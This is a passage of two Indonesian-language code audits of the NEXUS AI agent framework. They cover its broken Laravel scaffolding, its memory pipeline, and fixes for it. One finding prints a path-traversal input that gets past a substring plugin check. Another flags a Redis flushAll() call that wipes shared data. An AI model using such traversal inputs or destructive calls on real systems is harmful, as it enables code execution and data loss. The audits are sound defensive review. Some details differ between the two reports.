**Fokus Utama:** Apakah output akhir adalah web app yang bisa digunakan, dan apakah knowledge tersimpan ke memory inti NEXUS.

---

## Daftar Isi

1. [Ringkasan Eksekutif](#1-ringkasan-eksekutif)
2. [Peta Arsitektur Keseluruhan](#2-peta-arsitektur-keseluruhan)
3. [Temuan: Kekuatan Arsitektur](#3-temuan-kekuatan-arsitektur)
4. [Temuan: Risiko & Bug Kritis](#4-temuan-risiko--bug-kritis)
5. [Audit Ekstrem: Sandbox Pipeline End-to-End](#5-audit-ekstrem-sandbox-pipeline-end-to-end)
6. [Gap Analysis: "Web App yang Bisa Digunakan"](#6-gap-analysis-web-app-yang-bisa-digunakan)
7. [Gap Analysis: "Memory Inti Nexus"](#7-gap-analysis-memory-inti-nexus)
8. [Rekomendasi Perbaikan Prioritas](#8-rekomendasi-perbaikan-prioritas)
9. [Peta Jalan (Roadmap)](#9-peta-jalan-roadmap)

---

## 1. Ringkasan Eksekutif

NEXUS AI adalah framework orkestrasi multi-agent berbasis Node.js yang dirancang untuk membangun, mengaudit, dan mengevolusi project TALL Stack (Laravel + Livewire + Alpine.js + Tailwind CSS) secara otonom. Arsitekturnya terstruktur dengan baik, namun terdapat **6 gap kritis** yang menyebabkan dua tujuan utama — menghasilkan web app yang dapat digunakan dan menyimpan knowledge ke memory inti — **belum terpenuhi secara penuh**.

**Status Pipeline Saat Ini:**
- `spawnRealLaravel()` → **SENGAJA di-throw Error** (belum diimplementasikan)
- `WorktreeManager.isActive` → **hardcoded `false`** (Git isolation tidak aktif)
- `docker-compose.yml` → **tidak mendefinisikan Redis service** (memory backbone hilang)
- `KnowledgePhase.harvest()` → **berjalan, tapi sumber data seringkali kosong** karena sandbox tidak menghasilkan dokumentasi

---

## 2. Peta Arsitektur Keseluruhan

```
┌─────────────────────────────────────────────────────────────────┐
│  ENTRY LAYER                                                     │
│  cli.js ──► agent/main.js                                        │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  CORE ORCHESTRATOR: NexusEngine                                  │
│  State Machine: INIT → PROCESSING → EXECUTING → LOGGING → END   │
└──────────┬──────────────┬──────────────┬────────────────────────┘
           │              │              │
    ┌──────▼──────┐ ┌─────▼──────┐ ┌───▼──────────────────────┐
    │ Orchestrator│ │EvolutionP. │ │MemoryPipeline + Distiller│
    │ DLQ + Retry │ │Spawn/Harv. │ │Redis + KnowledgeHUB      │
    └──────┬──────┘ └─────┬──────┘ └──────────────────────────┘
           │              │
    ┌──────▼──────────────▼───────────────────────────────────┐
    │  PHASES PIPELINE (Sequential)                            │
    │  1. AuditPhase   → 6 specialist scanner, parallel-2     │
    │  2. PlanningPhase → findings → tasks → plan JSON        │
    │  2.5 ImplementationPhase → LLM generates PHP code       │
    │  3. ExecutionPhase → Modifier applies FILE_REPLACE etc  │
    │  4. VerificationPhase → Validator checks each task      │
    │  5. KnowledgePhase → Harvest → MemoryPipeline → HUB    │
    └─────────────────────────────────────────────────────────┘
           │
    ┌──────▼───────────────────────────────────────────────────┐
    │  INTELLIGENCE LAYER                                       │
    │  LocalIntelligence (Ollama: qwen3:8b)                    │
    │  Circuit Breaker + Task Whitelist + Prompt Size Guard    │
    └──────────────────────────────────────────────────────────┘
           │
    ┌──────▼───────────────────────────────────────────────────┐
    │  EXTERNAL SERVICES                                        │
    │  Ollama (LLM lokal) │ Redis (vector) │ Docker │ TALL Stack│
    └──────────────────────────────────────────────────────────┘
```

---

## 3. Temuan: Kekuatan Arsitektur

### 3.1 State Machine yang Eksplisit
`NexusEngine` mendefinisikan 6 lifecycle states secara eksplisit (`INIT`, `PROCESSING`, `EXECUTING`, `LOGGING`, `COMPLETED`, `FAILED`). Ini memudahkan debugging dan mencegah partial-state corruption.

### 3.2 Dead Letter Queue (DLQ) dengan Persistensi Disk
`Orchestrator` menyimpan task gagal ke `logs/dead_letter_queue.json` dengan retry otomatis ×3. Ini adalah pola production-grade yang jarang ditemukan di framework eksperimental sejenis.

### 3.3 Circuit Breaker pada LocalIntelligence
`LocalIntelligence` mengimplementasikan circuit breaker (CLOSED → OPEN → HALF_OPEN) untuk mencegah cascade failure saat Ollama overload. Dikombinasikan dengan TTL availability cache (60s sukses / 10s gagal), ini mencegah blocking calls yang sia-sia.

### 3.4 Guardrail EvolutionPiper
Hard cap `MAX_EVOLUTION_CYCLES = 25` dan `MAX_SESSION_MINUTES = 120` dengan persistensi ke `.evolution_state.json` adalah safety mechanism yang kritis untuk sistem otonom. Mencegah infinite loop yang bisa menghabiskan resource.

### 3.5 Path Traversal Protection di SandboxExecutor
`SandboxExecutor` menggunakan `path.resolve() + startsWith(allowedDir)` untuk mencegah path traversal, dan memvalidasi plugin terhadap `manifest.json`. Ini menutup vektor serangan yang umum.

### 3.6 Versioned Write di MemoryPipeline
Sebelum overwrite file knowledge, `MemoryPipeline.versionedWrite()` membuat backup bernama `basename_backup_{timestamp}.ext`. Tidak ada data knowledge yang hilang tanpa backup.

### 3.7 Task Whitelist di LocalIntelligence
Hanya 10 task type yang diizinkan memanggil LLM. Ini mencegah prompt injection atau penyalahgunaan API Ollama dari task yang tidak terdefinisi.

### 3.8 Parallel Audit dengan Concurrency Limit
`AuditPhase` menggunakan `ParallelRunner` dengan batas 2 concurrent specialist untuk mencegah OOM pada hardware terbatas (Ryzen 2500U, 8GB RAM). Ini adalah design decision yang sadar dan tepat.

### 3.9 Dynamic APP_KEY Generation
`EvolutionPiper.spawnSandbox()` menggunakan `crypto.randomBytes(32).toString('base64')` untuk APP_KEY, bukan hardcoded value. Ini menghindari security vulnerability umum pada project Laravel template.

---

## 4. Temuan: Risiko & Bug Kritis

### 🔴 KRITIS-1: `spawnRealLaravel()` Sengaja Di-throw
**File:** `agent/core/EvolutionPiper.js`  
**Kode:**
```javascript
async spawnRealLaravel(name) {
    throw new Error(
        'spawnRealLaravel: Not yet implemented. ' +
        'Use spawnSandbox(name, "crud") sebagai gantinya...'
    );
}
```
**Dampak:** Tidak ada project Laravel nyata yang pernah di-scaffold. Sandbox 'crud' hanya membuat 4 file stub (Controller, routes, migration, .env). Tidak ada `composer install`, tidak ada `npm install`, tidak ada server yang berjalan. **Output akhir bukan web app yang bisa digunakan.**

**Fix:** Implementasikan `composer create-project laravel/laravel` via `spawn()` dengan penanganan error dan timeout.

---

### 🔴 KRITIS-2: `WorktreeManager.isActive = false` (Hardcoded)
**File:** `agent/core/WorktreeManager.js`  
**Kode:**
```javascript
// ⛔ GUARD: Set ke true hanya setelah git commands diuji
this.isActive = false;
```
**Dampak:** Seluruh Git isolation layer tidak aktif. Perubahan dari sandbox berbeda bisa saling overwrite. Tidak ada branching, tidak ada merge strategy. Saat 100 project dijalankan paralel, race condition pada filesystem tidak terlindungi.

---

### 🔴 KRITIS-3: Redis Tidak Ada di `docker-compose.yml`
**File:** `docker-compose.yml`  
**Kondisi:** Hanya `nexus-ai` service yang didefinisikan. Tidak ada Redis service.
```yaml
services:
  nexus-ai:
    build: .
    # ... tidak ada redis service
```
**Dampak:** `RedisMemory` akan selalu gagal terkoneksi saat dijalankan via Docker. Seluruh vector memory backbone tidak tersedia. `MemoryPipeline` akan jatuh ke mode degraded tanpa fallback eksplisit.

---

### 🔴 KRITIS-4: `ImplementationPhase` Tidak Memanggil `artisan` atau `composer`
**File:** `agent/core/phases/ImplementationPhase.js`  
**Kondisi:** Phase ini hanya menulis file PHP (Model, Migration, Livewire Component) ke filesystem. Tidak ada:
- `composer install` untuk install dependencies
- `php artisan migrate` untuk membuat tabel database
- `php artisan key:generate` untuk APP_KEY
- `npm install && npm run build` untuk Vite/Tailwind compilation

**Dampak:** File PHP yang dihasilkan ada di folder yang benar, tapi aplikasi tidak bisa dijalankan karena tidak ada vendor directory, tidak ada database tables, dan tidak ada compiled assets.

---

### 🟡 SEDANG-5: Prompt 2MB Berpotensi Silent Truncation
**File:** `agent/prompts/internal/guru.md` (2.08MB), `orchestrator.md` (2.08MB), `pipeline-architect.md` (2.08MB)  
**Kondisi:** `LocalIntelligence` punya `MAX_PROMPT_CHARS = 30000` (~7500 tokens), tapi file prompt ini jauh lebih besar.
```javascript
const MAX_PROMPT_CHARS = 30000;
// ...
if (prompt.length > MAX_PROMPT_CHARS) {
    // truncated — tapi apakah ada handling?
}
```
**Dampak:** Konteks yang paling penting (bagian akhir prompt, instruksi spesifik) mungkin terpotong secara diam-diam. LLM menghasilkan output yang tidak sesuai ekspektasi tanpa error yang jelas.

---

### 🟡 SEDANG-6: `KnowledgePhase.harvest()` Sumber Data Seringkali Kosong
**File:** `agent/core/phases/KnowledgePhase.js`  
**Kondisi:** Harvest mencari folder `memory/operational`, `docs/summary`, `nexus/knowledge`, dll. di dalam sandbox. Tapi sandbox 'crud' yang di-spawn `EvolutionPiper` hanya berisi 4 file stub. Tidak ada folder `memory/` yang pernah dibuat di dalam sandbox.

**Dampak:** `filesHarvested = 0` hampir selalu terjadi. Tidak ada knowledge yang masuk ke HUB. Memory inti NEXUS tidak berkembang dari pengalaman sandbox.

---

### 🟡 SEDANG-7: `docker-compose.yml` Tidak Mount `nexus/native/`
**File:** `docker-compose.yml`  
**Kondisi:**
```yaml
volumes:
  - ./memory:/app/memory
  - ./documentation:/app/documentation
  - ./agent/prompts:/app/agent/prompts
  # nexus/native/ TIDAK di-mount
```
**Dampak:** Binary C++ (`sandbox_orchestrator`) tidak tersedia di dalam container. `NativeBridge.callCpp()` selalu throw "binary not found".

---

### 🟢 MINOR-8: Cycle Counter Tidak Thread-Safe untuk Multi-Instance
**File:** `agent/core/EvolutionPiper.js`  
**Kondisi:** Persistensi cycle ke `.evolution_state.json` tidak menggunakan atomic lock. Jika dua proses NEXUS berjalan bersamaan, mereka bisa membaca nilai lama dan sama-sama increment ke nilai yang sama.

---

### 🟢 MINOR-9: `NexusError` Terlalu Minimal (353 bytes)
**File:** `agent/core/NexusError.js`  
**Kondisi:** Tidak ada error codes, tidak ada severity levels, tidak ada stack enrichment. 30+ komponen throw error dengan format message yang berbeda-beda.

---

## 5. Audit Ekstrem: Sandbox Pipeline End-to-End

Berikut tracing lengkap jalur eksekusi dari `nexus run` hingga output, berdasarkan pembacaan source code aktual:

### 5.1 Entry Point
```
cli.js
  └─► NexusEngine.constructor()
        ├─ resolve paths (auditPath, logPath, planningPath, ...)
        ├─ new Modifier(), new MemoryPipeline(), new TDDGuard()
        ├─ new Orchestrator(), new EvolutionPiper()
        ├─ new LocalIntelligence(), new SemanticEngine()
        └─ new Distiller()
```

### 5.2 Phase 1: AuditPhase
```
AuditPhase.run(targetPath)
  ├─ Scan 6 standard Nexus folders → WARNING jika missing
  ├─ Cek README.md, .env, LICENSE
  └─ ParallelRunner (concurrency=2):
        ├─ cyber-security scanner
        ├─ ux-engineer scanner
        ├─ seo-performance-specialist scanner
        ├─ database-architect scanner
        ├─ vcs-architect scanner
        └─ documentation-architect scanner
        ▼ setiap scanner: SandboxExecutor.execute(scannerPath)
             └─ Worker Thread (plugin-worker.js)
                  └─ require(scannerPath)(targetPath)
                  └─ result → message → resolve
        ▼
        Tulis: memory/raw/report_{spec}_{auditID}.json
```

**⚠️ Gap Ditemukan:** Scanner berjalan di Worker Thread tapi `timeout = 30000ms` default. Scanner yang berat (database-architect melakukan recursive file scan) bisa timeout sebelum selesai pada project besar.

### 5.3 Phase 2: PlanningPhase
```
PlanningPhase.run(auditReport)
  ├─ Filter findings (hilangkan INFO)
  ├─ Map findings → tasks (dengan auto-action untuk kasus sederhana)
  │    Contoh: '.env detected' → task.action = FILE_APPEND(.gitignore)
  └─ Tulis: planning/plan_{planID}.json + plan_{planID}.md
```

**⚠️ Gap Ditemukan:** Auto-action hanya mencakup satu kasus (`.env detected`). Mayoritas findings tidak punya `task.action`, sehingga ExecutionPhase tidak melakukan modifikasi fisik apapun untuk temuan tersebut. Plan dibuat tapi tidak dieksekusi secara nyata.

### 5.4 Phase 2.5: ImplementationPhase
```
ImplementationPhase.run()
  ├─ Baca NEXUS_BLUEPRINT.json
  ├─ Untuk setiap model → LocalIntelligence.generate(prompt, 'build_model_migration')
  │    └─ Ollama HTTP POST /api/generate
  │    └─ Tulis: app/Models/{Model}.php
  ├─ Untuk setiap migration → generate + tulis ke database/migrations/
  └─ Untuk setiap Livewire component:
        ├─ generate PHP class → app/Livewire/{Class}.php
        └─ generate Blade view → resources/views/livewire/{name}.blade.php
```

**🔴 Gap Kritis:** Tidak ada langkah `composer install`, `php artisan migrate`, `php artisan key:generate`, atau `npm run build`. File dihasilkan tapi aplikasi tidak bisa dijalankan.

### 5.5 Phase 3: ExecutionPhase
```
ExecutionPhase.run(plan)
  ├─ Untuk setiap task dengan task.action:
  │    ├─ Jika FILE_REPLACE/FILE_APPEND → TDDGuard.validate()
  │    │    └─ Jika tidak ada test → TDDScaffolder.generate()
  │    ├─ Jika ASSET_OPTIMIZE → AssetEngine.process()
  │    └─ Else → Modifier.apply(task.action)
  │         ├─ FILE_REPLACE: baca file, replace konten, tulis kembali
  │         ├─ FILE_APPEND: append ke akhir file
  │         ├─ FILE_CREATE: buat file baru
  │         └─ RESOLVE_OPTIONS: handle collision markers
  └─ ExecutionPhase.verify(plan)
        └─ Validator.verifyAction(task.action) untuk setiap task done
```

**⚠️ Gap Ditemukan:** `cleanCodeAndVerify()` mencari `NEXUS_BLUEPRINT.json` untuk mendapatkan `legacy_patterns`. Jika blueprint tidak ada (yang terjadi pada sandbox baru), method ini membuat `legacyPatterns = []` dan tidak membersihkan apapun. Tidak ada error, tapi juga tidak ada verifikasi real.

### 5.6 Phase 5: KnowledgePhase (Memory Internalization)
```
KnowledgePhase.run()
  ├─ memoryPipeline.optimize()
  │    ├─ archiveAuditReports() → pindah JSON audit ke memory/archived/
  │    ├─ archiveImplementationPlans() → pindah JSON plan ke archived/
  │    ├─ processHarvestData()
  │    │    └─ Baca golden/harvest/{project}/**/*.md
  │    │    └─ Merge/deduplicate ke memory/distilled/
  │    └─ writeSemanticIndex() → buat NEXUS_INDEX.md
  └─ distiller.run()
        ├─ standardizeNames() → prefix NEXUS_ pada semua file HUB
        ├─ simplifyContent() → summarize file panjang via LLM
        └─ applySemanticLinking() → tambah cross-references antar file
```

**🔴 Gap Kritis:** `KnowledgePhase.harvest(sourcePath)` harus dipanggil secara eksplisit SETELAH sandbox selesai dibangun. Tidak ada mekanisme otomatis yang memastikan harvest dipanggil di akhir setiap sandbox lifecycle. Jika tidak dipanggil, `processHarvestData()` menemukan `golden/harvest/` kosong dan tidak ada yang diproses.

---

## 6. Gap Analysis: "Web App yang Bisa Digunakan"

Definisi "web app yang bisa digunakan": aplikasi yang dapat diakses melalui browser, memiliki UI, koneksi database, dan fungsionalitas dasar.

| Komponen | Status | Kondisi Aktual |
|---|---|---|
| File PHP (Model, Controller, Routes) | ✅ Dibuat | `ImplementationPhase` menulis file via LLM |
| Blade Views | ✅ Dibuat | `ImplementationPhase` menulis Blade templates |
| `composer install` | ❌ Tidak ada | Tidak pernah dipanggil |
| `vendor/` directory | ❌ Tidak ada | Autoload tidak tersedia |
| Database migration | ❌ Tidak ada | `php artisan migrate` tidak pernah dipanggil |
| APP_KEY | ⚠️ Parsial | Ada di `.env` tapi `artisan key:generate` tidak dipanggil |
| Compiled CSS/JS | ❌ Tidak ada | `npm run build` tidak pernah dipanggil |
| Dev server | ❌ Tidak ada | `php artisan serve` tidak pernah dipanggil |
| **Hasil Akhir** | ❌ **Tidak Bisa Digunakan** | Kumpulan file PHP tanpa runtime |

**Kesimpulan:** Saat ini NEXUS AI menghasilkan *scaffold* file PHP, bukan *web app yang berjalan*. Gap utama ada di antara "file dihasilkan" dan "aplikasi dijalankan".

---

## 7. Gap Analysis: "Memory Inti Nexus"

Definisi "memory inti": pengalaman, dokumentasi, dan knowledge dari tiap sandbox tersimpan permanen dan dapat diakses untuk project berikutnya.

| Komponen | Status | Kondisi Aktual |
|---|---|---|
| Audit reports ke disk | ✅ Berjalan | `AuditPhase` menulis JSON ke `memory/raw/` |
| Plan ke disk | ✅ Berjalan | `PlanningPhase` menulis JSON + MD ke `planning/` |
| MemoryPipeline archiving | ✅ Berjalan | Archive audit/plan ke `memory/archived/` |
| Distiller standardization | ✅ Berjalan | Prefix NEXUS_ pada file HUB |
| KnowledgePhase harvest | ⚠️ Parsial | Berjalan hanya jika dipanggil eksplisit |
| Harvest source (sandbox docs) | ❌ Kosong | Sandbox 'crud' tidak menghasilkan docs |
| Redis vector memory | ❌ Tidak aktif | Service tidak ada di docker-compose |
| LLM semantic linking | ⚠️ Parsial | Berjalan tapi sumber data minimal |
| **Hasil Akhir** | ⚠️ **Parsial** | Metadata tersimpan, knowledge tidak tumbuh |

**Kesimpulan:** Memory pipeline sudah terstruktur dengan baik, tapi "pakan" (knowledge dari sandbox) tidak mengalir karena sandbox tidak menghasilkan dokumentasi dan harvest tidak dipanggil otomatis.

---

## 8. Rekomendasi Perbaikan Prioritas

### R-01: Implementasikan `spawnRealLaravel()` [KRITIS]
Ganti throw Error dengan implementasi nyata:

```javascript
async spawnRealLaravel(name) {
    await this.checkEvolutionBoundary();
    const targetPath = path.join(this.sandboxPath, name);
    
    // Step 1: composer create-project
    await this._spawn('composer', [
        'create-project', 'laravel/laravel', name, '--no-interaction'
    ], { cwd: this.sandboxPath, timeout: 300000 });

    // Step 2: Install TALL Stack
    await this._spawn('composer', [
        'require', 'livewire/livewire', 'laravel/sanctum'
    ], { cwd: targetPath, timeout: 120000 });

    // Step 3: Tailwind + Alpine via npm
    await this._spawn('npm', ['install'], { cwd: targetPath, timeout: 120000 });

    return targetPath;
}
```

### R-02: Tambah Post-Implementation Runner [KRITIS]
Di akhir `ImplementationPhase.run()`, tambahkan:

```javascript
async bootstrapApplication() {
    const root = this.engine.rootPath;
    
    await this._run('composer', ['install', '--no-interaction'], root);
    await this._run('php', ['artisan', 'key:generate', '--force'], root);
    await this._run('php', ['artisan', 'migrate', '--force', '--seed'], root);
    await this._run('npm', ['install'], root);
    await this._run('npm', ['run', 'build'], root);
    
    this.log('✅ Application bootstrapped and ready.', 'success');
}
```

### R-03: Tambah Redis ke `docker-compose.yml` [KRITIS]
```yaml
services:
  redis:
    image: redis:7-alpine
    container_name: nexus_redis
    restart: unless-stopped
    networks:
      - nexus-internal
    volumes:
      - redis_data:/data

  nexus-ai:
    # ...existing config...
    depends_on:
      - redis
    environment:
      - REDIS_URL=redis://redis:6379

volumes:
  redis_data:
```

### R-04: Aktifkan `WorktreeManager` [KRITIS]
Ubah `isActive = true` setelah menambahkan error handling:

```javascript
this.isActive = process.env.NEXUS_GIT_ISOLATION === 'true';
```

Dan tambahkan di `.env`:
```
NEXUS_GIT_ISOLATION=true
```

### R-05: Auto-Trigger KnowledgePhase Harvest [SEDANG]
Di `EvolutionPiper.harvestWisdom()`, setelah copy logs, tambahkan trigger:

```javascript
async harvestWisdom(name) {
    // ... existing harvest logic ...
    
    // Auto-trigger KnowledgePhase untuk internalisasi
    const knowledgePhase = new KnowledgePhase(this.engine);
    await knowledgePhase.harvest(targetPath);
    await knowledgePhase.run(); // distill ke HUB
    
    console.log(`✅ Knowledge from [${name}] internalized to NEXUS core memory.`);
}
```

### R-06: Implementasikan Sandbox Documentation Writer [SEDANG]
Di akhir setiap sandbox build, generate dokumentasi yang menjadi "pakan" harvest:

```javascript
async generateSandboxDocumentation(targetPath, buildResult) {
    const docsPath = path.join(targetPath, 'nexus', 'memory', 'operational');
    await fs.ensureDir(docsPath);
    
    const doc = `# Sandbox Build Report
**Project:** ${path.basename(targetPath)}
**Date:** ${new Date().toISOString()}
**Status:** ${buildResult.success ? 'SUCCESS' : 'FAILED'}

## Files Generated
${buildResult.files.map(f => `- ${f}`).join('\n')}

## Lessons Learned
${buildResult.lessons.join('\n')}
`;
    await fs.writeFile(path.join(docsPath, 'BUILD_REPORT.md'), doc);
}
```

### R-07: Mount Native Binary di Docker [MINOR]
Tambahkan ke `docker-compose.yml`:
```yaml
volumes:
  - ./nexus/native:/app/nexus/native
```

### R-08: Perluas `NexusError` dengan Error Codes [MINOR]
```javascript
class NexusError extends Error {
    constructor(domain, message, code = 'NEXUS_UNKNOWN') {
        super(`[${domain}] ${message}`);
        this.code = code;
        this.domain = domain;
        this.timestamp = new Date().toISOString();
    }
}

// Usage:
throw new NexusError('EXECUTION', 'Binary not found', 'NEXUS_E001_BINARY_NOT_FOUND');
```

---

## 9. Peta Jalan (Roadmap)

### Fase A — Foundation Fix (1-2 minggu)
Fokus: Pipeline menghasilkan aplikasi yang bisa dibuka di browser.

1. Implementasikan `spawnRealLaravel()` dengan composer
2. Tambahkan `bootstrapApplication()` di akhir ImplementationPhase
3. Fix `docker-compose.yml` (Redis + volume native)
4. Aktifkan `WorktreeManager` via env flag

**Kriteria sukses:** `nexus run` → `php artisan serve` → browser menampilkan halaman Laravel

### Fase B — Knowledge Loop (2-3 minggu)
Fokus: Setiap sandbox build memperkaya memory inti NEXUS.

1. Implementasikan Sandbox Documentation Writer
2. Auto-trigger KnowledgePhase.harvest() di akhir setiap sandbox
3. Sambungkan Redis sebagai vector store yang aktif
4. Verifikasi distiller berjalan setelah setiap harvest

**Kriteria sukses:** Setelah 3 sandbox selesai, `memory/distilled/` memiliki knowledge yang terstruktur dari ketiga project

### Fase C — Quality & Scale (3-4 minggu)
Fokus: Stabilitas untuk 100 project target.

1. Implementasikan atomic Redis counter untuk EvolutionPiper
2. Implementasikan chunking untuk prompt >30KB
3. Perluas NexusError dengan error codes
4. Tambahkan health-check startup (python, C++, Redis, Ollama)
5. Implementasikan ConcurrencyGovernor global

**Kriteria sukses:** `nexus run` berhasil pada 10 project berturut-turut tanpa crash atau data corruption

---

*Dokumen ini dihasilkan berdasarkan analisis source code langsung dari file: `NexusEngine.js`, `Orchestrator.js`, `EvolutionPiper.js`, `Distiller.js`, `NativeBridge.js`, `SandboxExecutor.js`, `LocalIntelligence.js`, `WorktreeManager.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `ExecutionPhase.js`, `ImplementationPhase.js`, `PlanningPhase.js`, `AuditPhase.js`, `docker-compose.yml`, `package.json`.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_AI_ARCHITECTURE_AUDIT.MD

# NEXUS AI — Architecture Audit Report
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Version:** 3.3.0  
**Auditor:** AI Engineering Review  
**Tanggal:** 16 Mei 2026  
**Cakupan:** Seluruh `agent/core/`, `agent/phases/`, `agent/tools/`, `agent/main.js`, `.github/`, `.env`

---

## Ringkasan Eksekutif

Proyek NEXUS AI memiliki fondasi arsitektur yang solid: EventBus schema-validated, Dead Letter Queue di Orchestrator, guardrail whitelist di LocalIntelligence, versioned write di MemoryPipeline, dan circuit-aware ResourceMonitor. Namun setelah audit menyeluruh terhadap **27 file core**, ditemukan **27 isu** yang terdiri dari bug aktif, potensi crash, celah keamanan, dan technical debt yang perlu diselesaikan sebelum roadmap 100-project dapat berjalan stabil.

---

## Indeks Isu

| No | Komponen | Kategori | Severity |
|----|----------|----------|----------|
| 01 | `LocalIntelligence` | Prompt OOM | 🔴 Critical |
| 02 | `Orchestrator.executeTask` | Hanging Promise | 🔴 Critical |
| 03 | `NativeBridge` | Cross-platform | 🔴 Critical |
| 04 | `SandboxExecutor` | Security | 🔴 Critical |
| 05 | `RedisMemory` | Data Loss | 🔴 Critical |
| 06 | `Logger` | Data Corruption | 🔴 Critical |
| 07 | `NexusEngine` | God Object | 🟠 High |
| 08 | `LocalIntelligence` | Race Condition | 🟠 High |
| 09 | Ollama / LocalIntelligence | No Circuit Breaker | 🟠 High |
| 10 | `EventBus` | Memory Leak | 🟠 High |
| 11 | `AgentRegistry` | Not Wired | 🟠 High |
| 12 | `EvolutionPiper` | State Lost on Crash | 🟠 High |
| 13 | `WorktreeManager` | Blocking Event Loop | 🟠 High |
| 14 | `AuditPhase` | No Concurrency Limit | 🟠 High |
| 15 | `SemanticEngine` | NaN Corruption | 🟠 High |
| 16 | `RedisMemory` | Lazy Connect Bug | 🟠 High |
| 17 | `NexusEngine.runCycle` | No Global Timeout | 🟡 Medium |
| 18 | `EventBus` | Aggressive Dedup | 🟡 Medium |
| 19 | `MemoryPipeline` vs `SemanticEngine` | Duplicate Index | 🟡 Medium |
| 20 | `MemoryGovernor` vs `MemoryPipeline` | Overlapping Ownership | 🟡 Medium |
| 21 | `Contract.js` | Timestamp Inconsistency | 🟡 Medium |
| 22 | `ExecutionPhase` | Hardcoded Legacy Patterns | 🟡 Medium |
| 23 | `main.js` | Duplicate Orchestrator | 🟡 Medium |
| 24 | `EvolutionPiper.spawnRealLaravel` | Dead Code | 🟡 Medium |
| 25 | `Distiller` | Unused NativeBridge Instance | 🟡 Medium |
| 26 | `ExecutionPhase.getAvailablePort` | Unbounded Recursion | 🟡 Medium |
| 27 | `ci.yml` + `.env` | Security & CI Gap | 🟡 Medium |

---

## Detail Isu

---

### 🔴 01 — Prompt Files ~2MB Per File → OOM pada 7B Model

**File:** `agent/prompts/internal/guru.md`, `orchestrator.md`, `pipeline-architect.md`  
**Ukuran:** Masing-masing ~2MB  

**Masalah:**  
`LocalIntelligence.generate()` menggunakan `num_ctx: 4096` token dan model `qwen2.5-coder:7b-instruct-q4_K_M`. Prompt 2MB setara ±500k token — jauh melampaui context window. Ollama akan truncate atau crash dengan OOM. Pada mesin 8GB RAM yang dishare dengan Vega 8, ini hampir pasti fatal.

**Dampak:** Engine crash sebelum menghasilkan output apapun.

**Solusi:**
```
agent/prompts/internal/orchestrator/
  ├── core.md          (~30KB - instruksi inti + persona)
  ├── planning.md      (~20KB - hanya diload saat fase planning)
  ├── execution.md     (~20KB - hanya diload saat fase execution)
  └── recovery.md      (~10KB - error handling)
```

Di `LocalIntelligence.generate()`, pilih sub-prompt berdasarkan `taskType`, bukan satu file monolitik.

---

### 🔴 02 — `Orchestrator.executeTask`: Promise Tanpa Timeout → Hanging Forever

**File:** `agent/core/Orchestrator.js`  

**Masalah:**
```js
return new Promise((resolve, reject) => {
    EventBus.subscribe('SCANNER_FINISHED', onFinished);
    EventBus.subscribe('TASK_FAILED', onFailed);
    EventBus.publish('SCANNER_TRIGGERED', { ... });
    // ⚠️ Jika event tidak pernah fire → Promise nangkring selamanya
    // Tidak ada setTimeout, tidak ada cleanup
});
```

Jika Ollama crash atau plugin exit tanpa mengirim pesan, Promise tidak pernah resolve/reject. Ini menyebabkan `AuditPhase.run()` hang selamanya dan seluruh cycle tidak pernah selesai.

**Dampak:** Engine deadlock permanen.

**Solusi:**
```js
const timeout = setTimeout(() => {
    EventBus.unsubscribe('SCANNER_FINISHED', onFinished);
    EventBus.unsubscribe('TASK_FAILED', onFailed);
    reject(new Error(`Task ${taskId} timed out after ${task.timeout_ms}ms`));
}, task.timeout_ms || 30000);

// Tambahkan clearTimeout(timeout) di onFinished dan onFailed
```

---

### 🔴 03 — `NativeBridge.callCpp`: Hardcode `.exe` → Gagal di Docker/Linux

**File:** `agent/core/NativeBridge.js`

**Masalah:**
```js
const fullPath = path.join(this.binPath,
    binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`
);
```

`docker-compose.yml` ada di repo, artinya proyek ini dirancang untuk jalan di Linux container. Tapi `NativeBridge` selalu mencari `.exe` — binary Linux tidak punya extension ini. Setiap panggilan ke C++ module akan throw `binary not found`.

**Dampak:** Seluruh NativeBridge layer non-functional di Docker.

**Solusi:**
```js
const ext = process.platform === 'win32' ? '.exe' : '';
const fullPath = path.join(this.binPath, `${binaryName}${ext}`);
```

Tambahkan juga timeout untuk spawn process agar tidak hang:
```js
const timer = setTimeout(() => { proc.kill(); reject(new Error('C++ timeout')); }, 60000);
proc.on('close', () => clearTimeout(timer));
```

---

### 🔴 04 — `SandboxExecutor`: Path Traversal via Substring Check

**File:** `agent/core/SandboxExecutor.js`

**Masalah:**
```js
const isAllowed = manifest.scanners.some(s => pluginPath.includes(s.entrypoint));
```

Pengecekan ini adalah **substring match**, bukan path normalization. Path berikut akan **lolos** validasi:
```
../../malicious/cyber-security.js   ← includes "cyber-security.js" ✓ (SALAH LOLOS)
```

Selain itu, manifest dibaca dengan `readJsonSync` di dalam Promise — memblok event loop.

**Dampak:** Arbitrary code execution jika attacker bisa memanipulasi `pluginPath`.

**Solusi:**
```js
const allowedDir = path.resolve(path.join(__dirname, '..', 'tools', 'scanners'));
const resolvedPlugin = path.resolve(pluginPath);

if (!resolvedPlugin.startsWith(allowedDir)) {
    return reject(new Error(`SandboxExecutor: Plugin path not in allowed directory`));
}

// Gunakan fs.readJson async
const manifest = await fs.readJson(manifestPath);
const isAllowed = manifest.scanners.some(s =>
    resolvedPlugin === path.resolve(path.join(allowedDir, s.entrypoint))
);
```

---

### 🔴 05 — `RedisMemory.flush()` Memanggil `flushAll()` → Menghapus Seluruh Redis

**File:** `agent/core/RedisMemory.js`

**Masalah:**
```js
async flush() {
    if (!this.isConnected) return;
    await this.client.flushAll();  // ⚠️ Hapus SEMUA data di Redis
}
```

`flushAll()` menghapus **semua database** di Redis server, bukan hanya key milik NEXUS. Jika Redis dishare dengan Laravel app (sessions, cache, queue), maka saat `nexus distill` dipanggil, seluruh data Laravel ikut terhapus — termasuk user sessions yang aktif.

**Dampak:** Data loss pada aplikasi lain yang berbagi Redis server.

**Solusi:** Gunakan namespace prefix dan hapus hanya key NEXUS:
```js
const NEXUS_PREFIX = 'nexus:';

async flush() {
    if (!this.isConnected) return;
    const keys = await this.client.keys(`${NEXUS_PREFIX}*`);
    if (keys.length > 0) {
        await this.client.del(keys);
    }
}

async set(key, value, expirySeconds = 3600) {
    const namespacedKey = `${NEXUS_PREFIX}${key}`;
